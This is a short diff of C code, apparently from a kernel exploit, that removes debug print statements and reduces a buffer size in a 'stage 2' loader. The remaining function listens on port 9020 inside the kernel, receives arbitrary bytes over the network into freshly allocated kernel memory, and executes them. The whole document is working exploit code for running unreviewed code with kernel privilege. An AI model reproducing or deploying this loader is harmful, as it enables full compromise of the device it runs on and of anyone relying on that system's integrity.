@@ -22,7 +22,7 @@
 // clang-format on
 
 #define STAGE2_PORT 9020
-#define STAGE2_SIZE 0xC000
+#define STAGE2_SIZE 0x4000
 
 #define IFS6_OUT_MSG 0x88
 #define IFS6_OUT_NEIGHBORSOLICIT 0xe0
@@ -85,8 +85,6 @@ int so_setsockopt(void* so, int level, int optname, void* optval, size_t optlen)
 static void stage2_proc(void *arg) {
   uint64_t kaslr_offset = (uint64_t)arg;
 
-  int (*printf)(const char* format, ...) = (void*)kdlsym(printf);
-
   void (*kproc_exit)(int) = (void *)kdlsym(kproc_exit);
 
   void **kernel_map = (void **)kdlsym(kernel_map);
@@ -114,22 +112,16 @@ static void stage2_proc(void *arg) {
   sin.sin_addr.s_addr = __builtin_bswap32(INADDR_ANY);
   ksock_bind(so, (struct sockaddr *)&sin);
 
-  printf("Allocating memory for stage 2.\n");
   void *stage2 = kmem_alloc(*kernel_map, STAGE2_SIZE);
-  printf("stage 2 Pointer: %llX\n", stage2);
 
   size_t size = STAGE2_SIZE;
   ksock_recv(so, stage2, &size);
 
-  printf("Data Recieved: %llX\n", size);
-
   ksock_close(so);
 
-  printf("Calling Entrypoint.\n");
   void (*entry)(void) = (void *)stage2;
   entry();
 
-  printf("All done.\n");
   kproc_exit(0);
 }
 
